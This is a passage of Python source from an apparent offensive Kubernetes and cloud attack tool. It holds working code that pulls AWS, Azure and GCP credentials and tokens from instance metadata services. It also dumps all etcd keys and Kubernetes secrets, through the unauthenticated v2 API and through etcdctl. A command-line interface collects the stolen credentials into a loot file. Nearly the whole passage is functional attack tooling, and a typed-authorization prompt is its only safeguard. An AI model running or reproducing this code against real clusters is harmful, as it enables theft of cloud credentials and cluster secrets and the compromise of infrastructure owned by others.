                if cred_resp.ok:
                    cred_data = cred_resp.json()
                    if "AccessKeyId" in cred_data:
                        _log(f"[CloudBridge] AWS EKS node creds: {cred_data['AccessKeyId']}", "CRIT")
                        ctx.credentials.append(Credential(
                            "aws_eks_node_role",
                            {"AccessKeyId": cred_data["AccessKeyId"],
                             "SecretAccessKey": cred_data.get("SecretAccessKey", ""),
                             "Token": cred_data.get("Token", ""),
                             "Expiration": cred_data.get("Expiration", "")},
                            f"imds:{url}",
                            f"EKS node role '{role_name}' credentials",
                        ))
                        return AttackResult(
                            "cloud-bridge", "aws_eks_creds", "SUCCESS",
                            severity="CRITICAL",
                            data={"role": role_name, "key_id": cred_data["AccessKeyId"]},
                            notes=f"AWS EKS node role '{role_name}' creds extracted via IMDS",
                        )
            elif cloud_name in ("azure_aks", "gke_metadata"):
                try:
                    data = resp.json()
                    token = data.get("access_token", "")
                    if token:
                        _log(f"[CloudBridge] {cloud_name} token: {token[:30]}...", "CRIT")
                        ctx.credentials.append(Credential(
                            f"{cloud_name}_token",
                            {"access_token": token, "token_type": data.get("token_type", "")},
                            f"imds:{url}",
                            f"{cloud_name} managed identity token via IMDS",
                        ))
                        return AttackResult(
                            "cloud-bridge", f"{cloud_name}_token", "SUCCESS",
                            severity="CRITICAL",
                            data={"cloud": cloud_name, "token": token[:40] + "..."},
                            notes=f"{cloud_name} access token extracted via pod IMDS access",
                        )
                except Exception:
                    pass
            elif cloud_name == "gke_project":
                project_id = body.strip()
                return AttackResult("cloud-bridge", "gke_project", "INFO",
                                    data={"project_id": project_id},
                                    notes=f"GCP Project ID: {project_id}")
        except Exception:
            return None
        return None


# ── Module 6: Etcd Attack ─────────────────────────────────────────────────────

class EtcdModule:
    """Direct etcd access to extract all cluster secrets without K8s API auth."""

    def run(self, ctx: EngagementContext,
            etcd_host: str = "", cert_dir: str = "") -> List[AttackResult]:
        results = []
        host = etcd_host or ctx.api_host
        if not host:
            return [AttackResult("etcd", "config", "FAILED",
                                 notes="Specify --etcd-host or --api-host")]

        # 1. Check if etcd port is open
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, ETCD_PORT))
            s.close()
            _log(f"[Etcd] Port {ETCD_PORT} open on {host}", "OK")
        except Exception:
            return [AttackResult("etcd", "port_check", "FAILED",
                                 host=host,
                                 notes=f"etcd port {ETCD_PORT} not accessible on {host}")]

        # 2. Try unauthenticated HTTP (etcd v2 API)
        if REQUESTS:
            results.extend(self._etcd_v2_dump(ctx, host))
            results.extend(self._etcd_v3_check(ctx, host, cert_dir))

        return results

    def _etcd_v2_dump(self, ctx: EngagementContext, host: str) -> List[AttackResult]:
        try:
            # etcd v2 HTTP API (no auth by default in older clusters)
            resp = requests.get(f"http://{host}:{ETCD_PORT}/v2/keys/?recursive=true",
                                timeout=10, verify=False)
            if resp.status_code == 200:
                data = resp.json()
                _log(f"[Etcd] Unauthenticated etcd v2 accessible! Dumping all keys...", "CRIT")
                # Extract K8s secrets
                k8s_secrets = []
                self._recurse_etcd_keys(data.get("node", {}), k8s_secrets)
                ctx.loot["etcd_v2_dump"] = k8s_secrets[:50]
                return [AttackResult("etcd", "v2_dump", "SUCCESS",
                                     host=host, severity="CRITICAL",
                                     data={"keys_found": len(k8s_secrets)},
                                     notes=f"Etcd v2 unauthenticated! {len(k8s_secrets)} keys exposed. "
                                           f"All K8s secrets accessible.")]
        except Exception:
            pass
        return [AttackResult("etcd", "v2_probe", "INFO",
                             host=host, notes="etcd v2 not accessible or requires auth")]

    def _recurse_etcd_keys(self, node: Dict, results: List) -> None:
        if "value" in node:
            results.append({"key": node.get("key",""), "value": node.get("value","")[:200]})
        for child in node.get("nodes", []):
            self._recurse_etcd_keys(child, results)

    def _etcd_v3_check(self, ctx: EngagementContext,
                        host: str, cert_dir: str) -> List[AttackResult]:
        # etcd v3 uses gRPC — check via etcdctl if available
        etcdctl = "etcdctl" if not cert_dir else f"etcdctl --cacert={cert_dir}/ca.crt --cert={cert_dir}/server.crt --key={cert_dir}/server.key"
        try:
            proc = subprocess.run(
                f"ETCDCTL_API=3 {etcdctl} --endpoints=https://{host}:{ETCD_PORT} get / --prefix --keys-only 2>&1 | head -50",
                shell=True, capture_output=True, text=True, timeout=10
            )
            if proc.returncode == 0 and "/registry/" in proc.stdout:
                _log(f"[Etcd] etcdctl v3 accessible!", "CRIT")
                # Get K8s secrets
                proc2 = subprocess.run(
                    f"ETCDCTL_API=3 {etcdctl} --endpoints=https://{host}:{ETCD_PORT} get /registry/secrets --prefix 2>&1 | head -200",
                    shell=True, capture_output=True, text=True, timeout=15
                )
                ctx.loot["etcd_v3_secrets_raw"] = proc2.stdout[:2000]
                return [AttackResult("etcd", "v3_dump", "SUCCESS",
                                     host=host, severity="CRITICAL",
                                     data={"output": proc2.stdout[:500]},
                                     notes="etcd v3 accessible via etcdctl. All K8s secrets exposed.")]
        except Exception:
            pass
        return [AttackResult("etcd", "v3_probe", "INFO",
                             notes="etcd v3 not accessible without valid certs")]


# ── Output & CLI ──────────────────────────────────────────────────────────────

def print_banner() -> None:
    if PYFIGLET:
        import pyfiglet as pf
        print(f"\033[35m{pf.figlet_format('Kraken', font='slant')}\033[0m")
    else:
        print(f"\033[35m\n  {TOOL_NAME} v{VERSION}\n\033[0m")
    print(f"\033[36m  Author: {AUTHOR}  |  Kubernetes & Cloud Native Offensive Suite\033[0m\n")

def print_legal(yes: bool) -> bool:
    print(f"\033[33m{LEGAL_WARNING}\033[0m")
    if yes:
        return True
    try:
        ans = input("  Type 'yes' to confirm written authorization: ").strip().lower()
        return ans == "yes"
    except (KeyboardInterrupt, EOFError):
        return False

def dump_results(ctx: EngagementContext, output: Optional[str]) -> None:
    success = sum(1 for r in ctx.results if r.status == "SUCCESS")
    crits   = sum(1 for r in ctx.results if r.severity == "CRITICAL")
    print(f"\n\033[35m{'═'*60}\n  K8S ENGAGEMENT RESULTS\n{'═'*60}\033[0m")
    print(f"  Total: {len(ctx.results)} | Success: \033[32m{success}\033[0m | Critical: \033[35m{crits}\033[0m\n")
    for r in ctx.results:
        icons = {"SUCCESS":"\033[32m[+]","FAILED":"\033[31m[x]","PARTIAL":"\033[33m[~]","INFO":"\033[36m[*]"}
        c = icons.get(r.status,"   "); reset = "\033[0m"
        print(f"  {c}{reset} [{r.module}] {r.action}")
        if r.notes: print(f"        {r.notes}")
    if ctx.credentials:
        print(f"\n\033[32m[+] CREDENTIALS ({len(ctx.credentials)})\033[0m")
        for c in ctx.credentials:
            v = list(c.value.values())[0] if c.value else ""
            print(f"  [{c.type}] {c.source}: {str(v)[:60]}")
    if output:
        payload = {
            "tool": TOOL_NAME, "version": VERSION,
            "results": [{"module":r.module,"action":r.action,"status":r.status,
                         "severity":r.severity,"notes":r.notes} for r in ctx.results],
            "credentials": [{"type":c.type,"value":c.value,"source":c.source} for c in ctx.credentials],
            "loot": ctx.loot,
        }
        Path(output).write_text(json.dumps(payload, indent=2, default=str), encoding="utf-8")
        print(f"\n\033[32m[+] Results saved → {output}\033[0m")


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(prog=COMMAND, description=f"{TOOL_NAME} v{VERSION}",
                                formatter_class=argparse.RawDescriptionHelpFormatter,
                                epilog=textwrap.dedent(f"""
        Examples:
          python {COMMAND}.py --modules enum                                  # Using in-cluster config
          python {COMMAND}.py --kubeconfig ~/.kube/config --modules enum
          python {COMMAND}.py --api-host 10.0.0.1 --token TOKEN --modules secret-dump
          python {COMMAND}.py --modules escape                                # Check container escape
          python {COMMAND}.py --modules sa-abuse --target-sa default
          python {COMMAND}.py --modules cloud-bridge                          # Steal cloud creds via IMDS
          python {COMMAND}.py --etcd-host 10.0.0.1 --modules etcd
          python {COMMAND}.py --kubeconfig ~/.kube/config --modules all --output loot.json
        """))
    p.add_argument("--api-host",   default="", help="K8s API server host/IP")
    p.add_argument("--api-port",   type=int, default=6443)
    p.add_argument("--token",      default="", help="Bearer token for K8s API")
    p.add_argument("--kubeconfig", default="", help="Path to kubeconfig file")
    p.add_argument("--namespace",  default="default")
    p.add_argument("--etcd-host",  default="", help="Etcd host (for etcd module)")
    p.add_argument("--cert-dir",   default="", help="Dir with etcd TLS certs")
    p.add_argument("--target-sa",  default="", help="Target service account name")
    p.add_argument("--modules",    nargs="+",
                   choices=["enum","secret-dump","escape","sa-abuse","cloud-bridge","etcd","all"],
                   default=["enum"])
    p.add_argument("--output","-o", help="Save results to JSON file")
    p.add_argument("--yes","-y",   action="store_true")
    p.add_argument("--version",    action="version", version=f"{TOOL_NAME} v{VERSION}")
    return p


def main() -> int:
    parser = build_parser()
    args   = parser.parse_args()
    print_banner()
    if not print_legal(args.yes): return 1

    ctx = EngagementContext(
        api_host=args.api_host, api_port=args.api_port,
        token=args.token, kubeconfig=args.kubeconfig,
        namespace=args.namespace,
    )
    run_all = "all" in args.modules
    modules_to_run = ["enum","secret-dump","escape","sa-abuse","cloud-bridge","etcd"] if run_all else args.modules
    module_map = {
        "enum":         EnumModule(),
        "secret-dump":  SecretDumpModule(),
        "escape":       EscapeModule(),
        "sa-abuse":     SAAbuseModule(),
        "cloud-bridge": CloudBridgeModule(),
        "etcd":         EtcdModule(),
    }
    for mod_name in modules_to_run:
        mod = module_map.get(mod_name)
        if not mod: continue
        _log(f"Running module: {mod_name.upper()}", "INFO")
        try:
            if mod_name == "sa-abuse":
                results = mod.run(ctx, target_sa=args.target_sa)
            elif mod_name == "etcd":
                results = mod.run(ctx, etcd_host=args.etcd_host, cert_dir=args.cert_dir)
            else:
                results = mod.run(ctx)
            ctx.results.extend(results)
        except Exception as exc:
            _log(f"Module {mod_name} error: {exc}", "ERR")
    dump_results(ctx, args.output)
    return 0


if __name__ == "__main__":
    sys.exit(main())
